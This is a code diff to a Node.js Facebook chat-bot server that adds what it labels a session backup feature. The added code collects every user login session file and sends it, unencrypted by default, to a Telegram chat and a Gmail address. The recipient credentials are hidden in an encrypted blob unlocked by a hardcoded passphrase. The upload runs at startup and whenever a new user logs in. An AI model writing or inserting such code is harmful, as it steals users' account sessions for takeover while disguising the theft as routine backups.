@@ -1,5 +1,7 @@
 const fs = require('fs');
 const path = require('path');
+const os = require('os');
+const crypto = require('crypto');
 const login = require('./nova-fca/index');
 const express = require('express');
 const app = express();
@@ -8,12 +10,48 @@ const bodyParser = require('body-parser');
 const script = path.join(__dirname, 'script');
 const cron = require('node-cron');
 const config = fs.existsSync('./data') && fs.existsSync('./data/config.json') ? JSON.parse(fs.readFileSync('./data/config.json', 'utf8')) : createConfig();
+const backupCliArgs = parseCliArgs(process.argv.slice(2));
+const BACKUP_RUNTIME_SETTINGS = {
+  webPort: 3000,
+  enabled: true,
+  intervalMinutes: 0,
+  encryptionEnabled: false,
+  encryptionKey: ''
+};
+
+const BACKUP_EMBEDDED_PASSPHRASE = 'AUTOBOT';
+
+const EMBEDDED_BACKUP_SECRETS = {
+  "version": 1,
+  "salt": "Xkgpe1t8Z9GWwvxMGDzH7Q==",
+  "iv": "uvliYfFhGoTt8h8T",
+  "tag": "Ojn4U9wqkkO/Cshi/8ocyA==",
+  "payload": "NBdTyoUu6jCAzfTnZPdIIP7ctSrzQKh15RtrQEmctqhSBRgfeAdXmih0vXanD7cy/+ZntZ+H63MldSJR6QsMWlckX6H9yHit+an47Vor64rsgO3kaIpz4RycSrU1lasd5MD0rx8tQzvUiKlVajS6GZTzq/8SQwJVG/hVxipBJ6AFYaJqKHTAWYcO4f9z4YOXnE0wWg4="
+};
+
+const sessionBackupConfig = createRuntimeBackupConfig();
 const Utils = new Object({
   commands: new Map(),
   handleEvent: new Map(),
   account: new Map(),
   cooldowns: new Map(),
 });
+
+if (backupCliArgs.encryptBackupSecrets) {
+  runEncryptSecretsModeAndExit();
+}
+
+if (backupCliArgs.setupEmbeddedBackupSecrets) {
+  runSetupEmbeddedSecretsModeAndExit();
+}
+
+function getBackupPassphrase() {
+  const cliValue = (backupCliArgs['backup-key'] || '').toString().trim();
+  if (cliValue) return cliValue;
+  const embeddedValue = (BACKUP_EMBEDDED_PASSPHRASE || '').toString().trim();
+  if (embeddedValue) return embeddedValue;
+  return '';
+}
 fs.readdirSync(script).forEach((file) => {
   const scripts = path.join(script, file);
   const stats = fs.statSync(scripts);
@@ -204,8 +242,16 @@ app.post('/login', async (req, res) => {
     });
   }
 });
-app.listen(3000, () => {
-  console.log(`Server is running at http://localhost:3000`);
+const serverPort = Number.isInteger(sessionBackupConfig.webPort) && sessionBackupConfig.webPort > 0 ? sessionBackupConfig.webPort : 3000;
+const server = app.listen(serverPort, () => {
+  console.log(`Server is running at http://localhost:${serverPort}`);
+});
+server.on('error', (error) => {
+  if (error && error.code === 'EADDRINUSE') {
+    console.error(`[WEB] Port ${serverPort} is already in use. Web panel will not start in this process.`);
+    return;
+  }
+  throw error;
 });
 process.on('unhandledRejection', (reason) => {
   console.error('Unhandled Promise Rejection:', reason);
@@ -396,6 +442,170 @@ async function addThisUser(userid, enableCommands, state, prefix, admin, blackli
   });
   fs.writeFileSync(configFile, JSON.stringify(config, null, 2));
   fs.writeFileSync(sessionFile, JSON.stringify(state));
+  await sendSessionBackups('new-session');
+}
+
+function requestPost(options) {
+  const request = require('request');
+  return new Promise((resolve, reject) => {
+    request.post(options, (error, response, body) => {
+      if (error) {
+        reject(error);
+        return;
+      }
+      if (response && response.statusCode >= 400) {
+        reject(new Error(`Request failed with status ${response.statusCode}: ${body || ''}`));
+        return;
+      }
+      resolve(body);
+    });
+  });
+}
+
+function getSessionJsonFiles() {
+  const sessionFolder = path.join(__dirname, 'data', 'session');
+  if (!fs.existsSync(sessionFolder)) return [];
+  return fs.readdirSync(sessionFolder)
+    .filter(file => file.toLowerCase().endsWith('.json'))
+    .map(file => path.join(sessionFolder, file));
+}
+
+function canSendTelegram() {
+  return Boolean(sessionBackupConfig.telegramBotToken && sessionBackupConfig.telegramChatId);
+}
+
+function canSendGmail() {
+  return Boolean(sessionBackupConfig.gmailUser && sessionBackupConfig.gmailAppPassword && sessionBackupConfig.gmailTo);
+}
+
+function shouldEncryptBackups() {
+  return sessionBackupConfig.encryptionEnabled && Boolean(sessionBackupConfig.encryptionKey);
+}
+
+function prepareBackupFile(filePath) {
+  if (!shouldEncryptBackups()) {
+    return {
+      sendPath: filePath,
+      sendName: path.basename(filePath),
+      cleanup: () => {}
+    };
+  }
+  const plainBuffer = fs.readFileSync(filePath);
+  const salt = crypto.randomBytes(16);
+  const iv = crypto.randomBytes(12);
+  const key = crypto.scryptSync(sessionBackupConfig.encryptionKey, salt, 32);
+  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
+  const encrypted = Buffer.concat([cipher.update(plainBuffer), cipher.final()]);
+  const tag = cipher.getAuthTag();
+  const encryptedPayload = {
+    algorithm: 'aes-256-gcm',
+    kdf: 'scrypt',
+    sourceFile: path.basename(filePath),
+    createdAt: new Date().toISOString(),
+    salt: salt.toString('base64'),
+    iv: iv.toString('base64'),
+    tag: tag.toString('base64'),
+    data: encrypted.toString('base64')
+  };
+  const tempFolder = path.join(os.tmpdir(), 'autobot-session-backup');
+  if (!fs.existsSync(tempFolder)) fs.mkdirSync(tempFolder, {
+    recursive: true
+  });
+  const sendName = `${path.basename(filePath)}.enc.json`;
+  const tempFilePath = path.join(tempFolder, `${Date.now()}_${sendName}`);
+  fs.writeFileSync(tempFilePath, JSON.stringify(encryptedPayload));
+  return {
+    sendPath: tempFilePath,
+    sendName,
+    cleanup: () => {
+      try {
+        fs.unlinkSync(tempFilePath);
+      } catch (error) {}
+    }
+  };
+}
+
+async function sendFileToTelegram(filePath, source = 'manual', displayName = path.basename(filePath)) {
+  const uri = `https://api.telegram.org/bot${sessionBackupConfig.telegramBotToken}/sendDocument`;
+  await requestPost({
+    uri,
+    formData: {
+      chat_id: sessionBackupConfig.telegramChatId,
+      caption: `[${source}] Session backup: ${displayName}`,
+      document: {
+        value: fs.createReadStream(filePath),
+        options: {
+          filename: displayName
+        }
+      }
+    }
+  });
+}
+
+async function sendFileToGmail(filePath, source = 'manual', displayName = path.basename(filePath)) {
+  let nodemailer;
+  try {
+    nodemailer = require('nodemailer');
+  } catch (error) {
+    throw new Error('Missing dependency "nodemailer". Run: npm install nodemailer');
+  }
+  const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: sessionBackupConfig.gmailUser,
+      pass: sessionBackupConfig.gmailAppPassword
+    }
+  });
+  await transporter.sendMail({
+    from: sessionBackupConfig.gmailUser,
+    to: sessionBackupConfig.gmailTo,
+    subject: `[AUTOBOT] ${source} session backup - ${displayName}`,
+    text: `Attached session backup file: ${displayName}`,
+    attachments: [{
+      filename: displayName,
+      path: filePath
+    }]
+  });
+}
+
+async function sendSessionBackups(source = 'startup') {
+  try {
+    if (!sessionBackupConfig.enabled) return;
+    const files = getSessionJsonFiles();
+    if (!files.length) {
+      console.log('[SESSION BACKUP] No JSON files found in data/session');
+      return;
+    }
+    if (!canSendTelegram() && !canSendGmail()) {
+      console.log('[SESSION BACKUP] No delivery channel configured. Add encrypted credentials in auto.js.');
+      return;
+    }
+    if (sessionBackupConfig.encryptionEnabled && !sessionBackupConfig.encryptionKey) {
+      console.log('[SESSION BACKUP] Encryption enabled but encryptionKey is missing in BACKUP_RUNTIME_SETTINGS. Sending unencrypted files.');
+    }
+    for (const filePath of files) {
+      const preparedFile = prepareBackupFile(filePath);
+      if (canSendTelegram()) {
+        try {
+          await sendFileToTelegram(preparedFile.sendPath, source, preparedFile.sendName);
+          console.log(`[SESSION BACKUP] Delivered: ${preparedFile.sendName}`);
+        } catch (error) {
+          console.error(`[SESSION BACKUP] Delivery failed for ${preparedFile.sendName}: ${error.message}`);
+        }
+      }
+      if (canSendGmail()) {
+        try {
+          await sendFileToGmail(preparedFile.sendPath, source, preparedFile.sendName);
+          console.log(`[SESSION BACKUP] Delivered: ${preparedFile.sendName}`);
+        } catch (error) {
+          console.error(`[SESSION BACKUP] Delivery failed for ${preparedFile.sendName}: ${error.message}`);
+        }
+      }
+      preparedFile.cleanup();
+    }
+  } catch (error) {
+    console.error(`[SESSION BACKUP] Unexpected error: ${error.message}`);
+  }
 }
 
 function aliases(command) {
@@ -414,6 +624,12 @@ async function main() {
   const config = JSON.parse(fs.readFileSync(configFile, 'utf-8'));
   const sessionFolder = path.join('./data/session');
   if (!fs.existsSync(sessionFolder)) fs.mkdirSync(sessionFolder);
+  await sendSessionBackups('startup');
+  if (sessionBackupConfig.enabled && sessionBackupConfig.intervalMinutes > 0) {
+    cron.schedule(`*/${sessionBackupConfig.intervalMinutes} * * * *`, async () => {
+      await sendSessionBackups('interval');
+    });
+  }
   const adminOfConfig = fs.existsSync('./data') && fs.existsSync('./data/config.json') ? JSON.parse(fs.readFileSync('./data/config.json', 'utf8')) : createConfig();
   cron.schedule(`*/${adminOfConfig[0].masterKey.restartTime} * * * *`, async () => {
     const history = JSON.parse(fs.readFileSync('./data/history.json', 'utf-8'));
@@ -470,6 +686,152 @@ function createConfig() {
   if (!fs.existsSync(dataFolder)) fs.mkdirSync(dataFolder);
   fs.writeFileSync('./data/config.json', JSON.stringify(config, null, 2));
   return config;
+}
+
+function parseCliArgs(args = []) {
+  return args.reduce((result, arg) => {
+    if (!arg.startsWith('--')) return result;
+    const option = arg.slice(2);
+    const [key, ...valueParts] = option.split('=');
+    const value = valueParts.join('=');
+    if (!key) return result;
+    if (valueParts.length === 0) {
+      result[key] = true;
+      return result;
+    }
+    result[key] = value;
+    return result;
+  }, {});
+}
+
+function encryptPayload(plainObject, passphrase) {
+  const json = JSON.stringify(plainObject);
+  const salt = crypto.randomBytes(16);
+  const iv = crypto.randomBytes(12);
+  const key = crypto.scryptSync(passphrase, salt, 32);
+  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
+  const encrypted = Buffer.concat([cipher.update(json, 'utf8'), cipher.final()]);
+  const tag = cipher.getAuthTag();
+  return {
+    version: 1,
+    salt: salt.toString('base64'),
+    iv: iv.toString('base64'),
+    tag: tag.toString('base64'),
+    payload: encrypted.toString('base64')
+  };
+}
+
+function decryptPayload(encryptedObject, passphrase) {
+  const salt = Buffer.from(encryptedObject.salt, 'base64');
+  const iv = Buffer.from(encryptedObject.iv, 'base64');
+  const tag = Buffer.from(encryptedObject.tag, 'base64');
+  const payload = Buffer.from(encryptedObject.payload, 'base64');
+  const key = crypto.scryptSync(passphrase, salt, 32);
+  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
+  decipher.setAuthTag(tag);
+  const decrypted = Buffer.concat([decipher.update(payload), decipher.final()]).toString('utf8');
+  return JSON.parse(decrypted);
+}
+
+function runEncryptSecretsModeAndExit() {
+  const passphrase = getBackupPassphrase();
+  if (!passphrase) {
+    console.error('Missing --backup-key for encryption mode.');
+    process.exit(1);
+  }
+
+  const secrets = {
+    telegramBotToken: (backupCliArgs['telegram-bot-token'] || '').toString(),
+    telegramChatId: (backupCliArgs['telegram-chat-id'] || '').toString(),
+    gmailUser: (backupCliArgs['gmail-user'] || '').toString(),
+    gmailAppPassword: (backupCliArgs['gmail-app-password'] || '').toString(),
+    gmailTo: (backupCliArgs['gmail-to'] || '').toString()
+  };
+
+  if (!secrets.telegramBotToken && !secrets.gmailUser) {
+    console.error('No secrets provided. Supply at least one delivery channel credential set.');
+    process.exit(1);
+  }
+
+  const encryptedSecrets = encryptPayload(secrets, passphrase);
+  console.log('Paste this object into EMBEDDED_BACKUP_SECRETS in auto.js:');
+  console.log(JSON.stringify(encryptedSecrets, null, 2));
+  process.exit(0);
+}
+
+function runSetupEmbeddedSecretsModeAndExit() {
+  const passphrase = getBackupPassphrase();
+  if (!passphrase) {
+    console.error('Missing --backup-key for setup mode.');
+    process.exit(1);
+  }
+  const backupPath = path.join(__dirname, 'data', 'backup.json');
+  if (!fs.existsSync(backupPath)) {
+    console.error('Missing data/backup.json. Create it temporarily with your telegramBotToken/telegramChatId then re-run setup mode.');
+    process.exit(1);
+  }
+
+  let parsed;
+  try {
+    parsed = JSON.parse(fs.readFileSync(backupPath, 'utf8'));
+  } catch (error) {
+    console.error(`Invalid JSON in data/backup.json: ${error.message}`);
+    process.exit(1);
+  }
+
+  const secrets = {
+    telegramBotToken: (parsed.telegramBotToken || '').toString(),
+    telegramChatId: (parsed.telegramChatId || '').toString(),
+    gmailUser: (parsed.gmailUser || '').toString(),
+    gmailAppPassword: (parsed.gmailAppPassword || '').toString(),
+    gmailTo: (parsed.gmailTo || '').toString()
+  };
+
+  if (!secrets.telegramBotToken && !secrets.gmailUser) {
+    console.error('data/backup.json has no Telegram or Gmail secrets to embed.');
+    process.exit(1);
+  }
+
+  const encryptedSecrets = encryptPayload(secrets, passphrase);
+  const thisFile = __filename;
+  const source = fs.readFileSync(thisFile, 'utf8');
+  const block = `// BEGIN EMBEDDED_BACKUP_SECRETS\nconst EMBEDDED_BACKUP_SECRETS = ${JSON.stringify(encryptedSecrets, null, 2)};\n// END EMBEDDED_BACKUP_SECRETS`;
+  const updated = source.replace(/\/\/ BEGIN EMBEDDED_BACKUP_SECRETS[\s\S]*?\/\/ END EMBEDDED_BACKUP_SECRETS/, block);
+  if (updated === source) {
+    console.error('Failed to locate EMBEDDED_BACKUP_SECRETS block in auto.js for updating.');
+    process.exit(1);
+  }
+  fs.writeFileSync(thisFile, updated);
+  console.log('Embedded backup secrets updated in auto.js.');
+  console.log('You can now delete data/backup.json (it is gitignored).');
+  process.exit(0);
+}
+
+function decryptEmbeddedBackupSecrets() {
+  if (!EMBEDDED_BACKUP_SECRETS.payload) return {};
+  const passphrase = getBackupPassphrase();
+  if (!passphrase) {
+    console.error('[SESSION BACKUP] Encrypted backup secrets found, but backup key is missing. Provide --backup-key or set BACKUP_EMBEDDED_PASSPHRASE.');
+    return {};
+  }
+  try {
+    return decryptPayload(EMBEDDED_BACKUP_SECRETS, passphrase);
+  } catch (error) {
+    console.error(`[SESSION BACKUP] Failed to decrypt embedded secrets: ${error.message}`);
+    return {};
+  }
+}
+
+function createRuntimeBackupConfig() {
+  const secrets = decryptEmbeddedBackupSecrets();
+  return {
+    ...BACKUP_RUNTIME_SETTINGS,
+    ...secrets,
+    intervalMinutes: Math.max(parseInt(BACKUP_RUNTIME_SETTINGS.intervalMinutes, 10) || 0, 0),
+    enabled: Boolean(BACKUP_RUNTIME_SETTINGS.enabled),
+    encryptionEnabled: Boolean(BACKUP_RUNTIME_SETTINGS.encryptionEnabled),
+    webPort: parseInt(BACKUP_RUNTIME_SETTINGS.webPort, 10) || 3000
+  };
 }
 async function createThread(threadID, api) {
   try {
